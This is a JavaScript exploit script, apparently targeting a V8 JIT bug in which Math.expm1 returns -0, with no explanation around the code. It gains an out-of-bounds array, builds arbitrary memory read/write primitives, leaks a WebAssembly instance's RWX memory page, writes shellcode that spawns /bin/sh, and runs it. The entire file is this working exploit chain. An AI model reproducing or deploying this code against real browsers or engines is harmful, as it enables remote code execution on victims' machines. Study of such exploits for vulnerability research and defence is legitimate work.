class Memory {
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.f64 = new Float64Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u8 = new Uint8Array(this.buf);
    }
    f2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[1] * 0x100000000 + tmp[0];
    }
    u2f(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000 );
        this.u32.set(tmp);
        return this.f64[0];
    }
}

var mem = new Memory();

var arrs = [];
var objs = [];
var bufs = [];

function opt_me(x){
    let obj1 = {mz : -0};
    let arr1 = [1.1,1.2,1.3];
    let a = [0.4, 0.5];
    arrs.push(a);
    objs.push({marker: 0x41414141, obj: {}});
    bufs.push(new ArrayBuffer(0x41));
    let z = Object.is(Math.expm1(x), obj1.mz);

    arr1[z * 10] = mem.u2f(0x000000a000000000);

}




opt_me(0);
for (let i = 0; i < 0x10000; i++){
    opt_me("0");
}

opt_me(-0);

let oobarroffset = 0;
for(let i = 0; i < arrs.length; i++){
    if(arrs[i].length === 0xa0){
        console.log("[*] arrs offset is " + i.toString());
        oobarroffset = i;
        break;
    }
}

var oob_arr = arrs[oobarroffset];

var leak_heap = mem.f2u(oob_arr[22]);
console.log("[*] Leak heap addr is 0x" + leak_heap.toString(16));

// for (let i = 0; i < oob_arr.length; i++){
//     console.log("0x" + mem.f2u(oob_arr[i]).toString(16));
// }
//
// console.log("0x" + mem.f2u(oob_arr[16]).toString(16));

let vic_offset = 0
for (let i = 0; i < 0x20; i++){
    if(mem.f2u(oob_arr[i]) === 0x41){
        vic_offset = i + 1;
        break;
    }
}

var vic_buff = bufs[oobarroffset];


class artRW{
    constructor(oob_offset){
        this.oobofset = oob_offset;
    }
    read(addr){
        oob_arr[this.oobofset] = mem.u2f(addr);
        let tmp = new Float64Array(vic_buff,0,8);
        return mem.f2u(tmp[0]);
    }
    write(addr, data){
        oob_arr[this.oobofset] = mem.u2f(addr);
        let tmp = new Float64Array(vic_buff,0, 8);
        tmp.set([mem.u2f(data)]);
    }
    writebuf(addr, data){
        oob_arr[this.oobofset] = mem.u2f(addr);
        let u8 = new Uint8Array(vic_buff);
        for (let i = 0; i < data.length; i++){
            u8[i] = data[i];
        }
    }
}
var arw = new artRW(vic_offset);

let vic_obj = objs[oobarroffset];

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,116,101,115,116,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,32,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.test;

vic_obj.obj = f;

let leakfun = mem.f2u(oob_arr[17]);

console.log("[*] leak function addr is 0x" + leakfun.toString(16));

let shared_info = arw.read(leakfun - 1 + 0x18);
console.log("[*] leak shared_info is 0x" + shared_info.toString(16));


let Wasmdata = arw.read(shared_info - 1 + 0x8);
console.log("[*] leak Wasmdata addr is 0x" + Wasmdata.toString(16));

let instance_addr = arw.read(Wasmdata - 1 + 0x10);
console.log("[*] leak instance addr is " + instance_addr.toString(16));

let rwxmap = arw.read(instance_addr - 1 + 0xe8)
console.log("[*] leak rwx map is 0x" + rwxmap.toString(16));

let sc = [0x50,0x48,0x31,0xc0,0x48,0x31,0xd2,0x48,0x31,0xf6,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x54,0x5f,0xb0,0x3b,0x0f,0x05];

let shellcode = [0x48d23148c0314850, 0x6e69622fbb48f631, 0xb05f545368732f2f, 0x50f3b]



arw.writebuf(rwxmap, sc);


f();